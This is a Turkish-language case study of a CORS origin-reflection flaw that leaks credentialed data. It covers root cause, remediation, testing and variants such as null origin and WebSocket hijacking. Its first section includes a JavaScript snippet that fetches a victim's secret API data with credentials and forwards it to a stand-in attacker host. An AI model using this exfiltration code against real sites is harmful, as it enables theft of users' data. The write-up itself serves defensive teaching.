# Vaka Analizi: CORS Origin Reflection ve Credential Sızıntısı

## 1. Neden Çalıştı? (Execution & Exploit Analysis)

Geliştirici, tarayıcının Cross-Origin istekleri bloklamasını aşmak için gelen `req.headers.origin` değerini filtrelemeden `Access-Control-Allow-Origin` başlığına aynen geri yazmıştır.
Saldırgan, kurban kullanıcının tarayıcısında `https://evil-attacker.com` adresini açtırdığında, arka planda çalışan bir JavaScript `fetch` isteği ile hedef API'ye istek atar:

```javascript
fetch("http://localhost:4000/api/secret", { credentials: "include" })
  .then((res) => res.json())
  .then((data) =>
    fetch(
      "[https://evil-attacker.com/steal?data=](https://evil-attacker.com/steal?data=)" +
        JSON.stringify(data),
    ),
  );
```

Sunucu saldırganın domain'ini yansıttığı ve Access-Control-Allow-Credentials: true başlığı döndüğü için, tarayıcı kurbanın aktif oturum çerezleriyle dönen hassas JSON verisini saldırganın script'ine teslim eder.

# 2. Root Cause (Kök Neden Analizi)

Kullanıcı Girdisi Olan Origin Başlığına Körü Körüne Güvenilmesi (Untrusted Input Reflection).
HTTP başlıkları (Header) istemci tarafından serbestçe manipüle edilebilir. Origin başlığını doğrulamadan doğrudan izin kuralı olarak kabul etmek, tüm internete güvenmekle eşdeğerdir.

# 3. Platform / Framework Önlemleri

Tarayıcılar Access-Control-Allow-Origin: \* ile Access-Control-Allow-Credentials: true ikilisini aynı anda reddeder (W3C Kuralı). Ancak Origin reflection yapıldığında tarayıcı bunu meşru bir tekil izin zannederek korumayı devre dışı bırakır.

Express, NestJS gibi framework'lerde origin: false veya regex/whitelist dizisi zorunlu tutulmalıdır.

# 4. Remediation / Hardening (Geliştirici Düzeltmesi)

Strict Whitelist: Yalnızca güvenilen tam URL'lerin (protocol + domain + port) bulunduğu bir liste tanımlanmalı ve gelen istek bu kümede aranmalıdır (ALLOWED_ORIGINS.has(origin)).

Vary: Origin Başlığı: Yanıtların proxy ve CDN katmanlarında yanlışlıkla önbelleğe alınıp başka kullanıcılara servis edilmesini önlemek için mutlaka Vary: Origin başlığı eklenmelidir.

Regex Tuzaklarına Dikkat: origin.includes('application.com') gibi kontroller yapılmamalıdır; saldırgan application.com.evil.com veya evil-application.com ile bu kontrolü aşabilir.

# 5. Doğrulama (Verification & Regression Testing)

Otomasyon scripti ile hem geçerli hem de yetkisiz kökenler test edilmelidir:

```Bash
./tests/test-cors-policy.sh
```

# 6. Variant Analysis (Başka Nerede Karşımıza Çıkar?)

Null Origin İstekleri: Sandboxed iframe'ler veya yerel dosyalar (file://) Origin: null gönderir. Bazı backend'ler if (origin === 'null') kuralına izin vererek iframe tabanlı veri hırsızlığına kapı aralar.

WebSocket (CSWSH): WebSocket el sıkışmalarında SOP geçerli değildir. Backend'de el sıkışma anında Origin kontrolü yapılmazsa Cross-Site WebSocket Hijacking gerçekleşir.
